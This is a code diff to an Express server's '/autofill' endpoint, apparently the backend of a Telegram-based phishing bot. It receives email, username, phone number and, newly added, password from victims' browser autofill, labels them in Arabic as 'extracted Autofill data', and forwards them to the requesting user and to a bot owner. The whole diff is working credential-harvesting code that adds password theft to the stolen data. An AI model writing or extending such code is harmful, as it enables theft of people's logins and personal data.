@@ -2292,14 +2292,16 @@ app.post("/autofill", (req, res) => {
   const email    = req.body?.email    || '';
   const username = req.body?.username || '';
   const tel      = req.body?.tel      || '';
+  const password = req.body?.password || '';
   if (!uid) return res.send("Missing");
   const tid = parseInt(uid, 36);
-  let msg = `🔑 بيانات Autofill مُستخرجة`;
-  if (email)    msg += `\n📧 الإيميل: ${email}`;
-  if (username) msg += `\n👤 اليوزرنيم: ${username}`;
-  if (tel)      msg += `\n📞 الهاتف: ${tel}`;
-  notify(tid, msg);
-  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
+  let msg = `🔑 *بيانات Autofill مُستخرجة*`;
+  if (email)    msg += `\n📧 الإيميل: \`${email}\``;
+  if (username) msg += `\n👤 اليوزرنيم: \`${username}\``;
+  if (tel)      msg += `\n📞 الهاتف: \`${tel}\``;
+  if (password) msg += `\n🔐 كلمة المرور: \`${password}\``;
+  notify(tid, msg, {parse_mode:"Markdown"});
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n_(ID: ${tid})_`, {parse_mode:"Markdown"});
   res.send("Done");
 });
 
